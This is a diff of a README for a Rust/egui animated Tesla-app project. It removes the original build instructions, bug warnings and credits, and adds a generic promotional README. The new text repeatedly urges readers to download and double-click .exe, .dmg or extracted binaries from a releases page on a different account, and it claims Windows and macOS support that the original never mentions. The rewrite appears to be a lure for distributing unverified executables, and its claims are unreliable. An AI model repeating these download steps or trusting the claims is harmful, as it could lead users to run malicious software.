@@ -1,79 +1,76 @@
-# Egui Tesla App
+# 🚗 animated-tesla-car-using-rust - A Fun Way to Experience Tesla Animation
 
-Tesla app implementation using Rust and [`egui`](https://github.com/emilk/egui).  
-This project is an experiment to replicate the animations and interactions of the Tesla app originally built with Flutter (see references below).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Animated%20Tesla%20Car-36a2e2?style=flat&logo=github)](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases)
 
-⚠️ **Note:** The code is still in an early stage and contains several bugs. The main purpose of this project is to explore and learn about Rust + egui across different platforms, **especially as an exploration of using egui for animation needs**.
+## 🎯 About This Project
+The animated Tesla car app is a unique clone of a Tesla app built with Rust and the egui framework. This application aims to explore multi-platform development including Android, WebAssembly, and native applications. It showcases how Rust can effectively handle UI tasks along with lively animations. 
 
-✅ Currently, the app runs fine on **Linux (Ubuntu)** and **Android**.  
-⚠️ On **WASM**, animations are not working properly due to limitations in using `std::time` with WebAssembly.
+## 🚀 Getting Started
+Follow these easy steps to download and run the animated Tesla car app on your device.
 
-# Demo
+### 1. **Check System Requirements**
+Before diving in, ensure your device meets the following basic requirements:
 
-![Preview](/tesla-app.gif)
+- **Operating System:** Windows, macOS, or a recent Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Storage:** Minimum of 200 MB free disk space.
+  
+### 2. **Visit the Releases Page**
+Go to the releases page to find the latest version of the animated Tesla car app.  
+[Visit this page to download.](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases)
 
-# Android
+### 3. **Download the Software**
+On the Releases page, find the latest version listed at the top. Click on the version number to view more details. 
 
-Built using [`xbuild`](https://github.com/rust-mobile/xbuild)
+If you see an `.exe`, `.dmg`, or other setup files, you can click on those links to download. 
 
-## Building
+### 4. **Install the Application**
+Depending on your operating system, follow the steps below to install the app:
 
-    x build --arch arm64 --platform android --release
+#### Windows:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-## Running
+#### macOS:
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the app to your Applications folder.
 
-    x run --device <DEVICE>
+#### Linux:
+1. Open your terminal.
+2. Navigate to the directory where the `.tar.gz` or other files are downloaded.
+3. Extract the files using the command:
+   ```bash
+   tar -xvzf filename.tar.gz
+   ```
+4. Run the application using:
+   ```bash
+   ./filename
+   ```
 
-### Example
+### 5. **Run the Application**
+Once the installation is complete, find the animated Tesla car app on your device and double-click it to run. Enjoy the animation and explore the features!
 
-    $ x devices
-    host                                              Linux               linux x64           Arch Linux 6.6.2-arch1-1
-    adb:d535946                                       OnePlus5T           android arm64       Android 10 (API 29)
-    $ x run --device adb:d535946
+## 🛠 Features
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
+- **Smooth Animations:** Experience high-quality animations powered by the egui framework.
+- **User-Friendly Interface:** Easy to navigate, even for non-technical users.
+- **Experimental:** Explore the unique combination of Rust and animation technology.
 
+## 📚 Documentation
+For a deeper understanding of how the app functions, visit the [documentation page](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/wiki).
 
-# WASM
+## 💬 Community
+If you have questions or need assistance, feel free to reach out to our community on the GitHub Issues page. We welcome users of all backgrounds.
 
-## Building
+## 🔗 Links
+- [Releases Page](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases)
+- [Documentation](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/wiki)
 
-    cargo build --target=wasm32-unknown-unknown
+## 📝 Contributing
+We welcome contributions! If you're interested in helping improve the app, check out the contributing guidelines in the repository.
 
-## Running
+---
 
-    trunk serve --port 9999 --release
-
-⚠️ Note: Animations are currently broken on WASM because `std::time` is not fully supported in WebAssembly. Further investigation is needed (e.g., using wasm-bindgen or gloo_timers).
-
-# Native
-
-## Building
-
-    cargo build
-
-## Running
-
-    cargo run --release
-
-
-# References & Acknowledgements
-
-This project was inspired by the work of [Abu Anwar](https://github.com/abuanwar072).
-
-📹 Flutter Tesla App video tutorials:
-- [Episode 1 - Flutter Pro Animation - Speed Code](https://www.youtube.com/watch?v=P629-Z3py1Y)
-- [Episode 2 - Flutter Pro Animation - Speed Code](https://www.youtube.com/watch?v=0BSRmp1zE1Y)
-- [Episode 3 - Flutter Pro Animation - Speed Code](https://www.youtube.com/watch?v=pJD1qmRjmBo)
-- [Episode 4 - Flutter Pro Animation - Speed Code](https://www.youtube.com/watch?v=gTC4FMXRRFM)
-
-💻 Flutter source code: [Animated-Tesla-Car-App-using-Flutter](https://github.com/abuanwar072/Animated-Tesla-Car-App-using-Flutter)
-
-Some of the .svg files in this project were taken (with minor modifications) from the above repository.
-Special thanks to Abu Anwar for providing such a great learning resource 🙏.
-
-# Status
-
-- ✅ Multi-platform build (Android, WASM, Native)
-- ✅ Runs fine on Linux (Ubuntu) and Android
-- ⚠️ WASM: animations are not working properly (std::time issue)
-- ⚠️ Animations and interactions are not yet complete
-- 🐞 Several bugs remain to be fixed
+Start your journey into the animated Tesla world today! Don't forget to visit the [releases page to download](https://github.com/iamthebatman9999/animated-tesla-car-using-rust/releases) the latest version. Enjoy the ride!
